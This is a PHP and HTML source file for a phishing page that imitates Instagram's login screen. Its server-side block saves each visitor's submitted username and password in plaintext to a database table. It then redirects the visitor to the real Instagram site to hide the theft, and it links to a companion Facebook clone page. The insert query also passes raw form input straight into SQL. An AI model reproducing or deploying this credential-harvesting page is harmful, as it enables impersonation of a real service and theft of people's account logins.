<?php 

// This is for Connection File
include('dbcon.php');
?>

<?php 

if(isset($_POST['login_button']))
{
  // When Button is clicked 


  //Declare Input for Username and Password 
  $username_input = $_POST['username_input'];
  $password_input = $_POST['password_input'];

  //Insert to Database
  $query = "INSERT INTO  instagram_info (username, password)VALUES('$username_input','$password_input')";
  $query_run = mysqli_query($conn, $query);

  //Send User to Legit Website
  header("Location: http://www.instagram.com");
		
}

?>


<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  <title>Instagram</title>
  <!-- Stylesheet -->
  <link rel="stylesheet" type="text/css" href="style.css">
  <!-- Font awesome -->
  <script src="https://kit.fontawesome.com/4e6b50c3ce.js" crossorigin="anonymous"></script>
</head>
<body>

   <form action="index.php" method="POST">
  <section class="wrapper">
    <div class="left">
      <img src="images/phones.png" alt="phone">
      <img class="screen" src="images/screen.jpg" alt="phone-screen">
    </div>
    <div class="right">
      <div class="panel login">
        <img id="logo" src="images/instagram-logo.png" alt="logo">
        <form>
          <input
            class="input-box"
            type="text"
            name="username_input"
            required
            placeholder="Phone number, username, or email">
          <input
            class="input-box"
            type="password"
            name="password_input"
            required
            placeholder="Password">

          <input class="button" type="submit" name="login_button" value="Log In">

          </form>
          <div class="divider">
            <div class="line"></div>
            <p>OR</p>
            <div class="line"></div>
          </div>
          <a class="fb" href='facebook-clone-master/facebook.php'>Log in with Facebook</a>
          <a class="forgot" href=#>Forgot password?</a>
        </form>
      </div>
      <div class="panel signup">
        <p>Don't have an account?</p>
        <a href=#>Sign up</a>
      </div>
      <div class="apps">
        <p>Get the app.</p>
        <div class="app-stores">
          <img src="images/app-store.svg" alt="App Store">
          <img src="images/play-store.svg" alt="Play Store">
        </div>
      </div>
    </div>
  </section>
  <footer>
    <ul>
      <li><a href=#>About</a></li>
      <li><a href=#>Blog</a></li>
      <li><a href=#>Jobs</a></li>
      <li><a href=#>Help</a></li>
      <li><a href=#>API</a></li>
      <li><a href=#>Privacy</a></li>
      <li><a href=#>Terms</a></li>
      <li><a href=#>Top Accounts</a></li>
      <li><a href=#>Hashtags</a></li>
      <li><a href=#>Locations</a></li>
      <li><a href=#>Instagram Lite</a></li>
      <li><a href=#>Beauty</a></li>
      <li><a href=#>Dance</a></li>
      <li><a href=#>Fitness</a></li>
      <li><a href=#>Food & Drink</a></li>
      <li><a href=#>Home & Garden</a></li>
      <li><a href=#>Music</a></li>
      <li><a href=#>Visual Arts</a></li>
    </ul>
    <ul>
      <li>English</li>
      <li>&copy; 2021 Instagram from Facebook</li>
    </ul>
  </footer>
</body>
</html>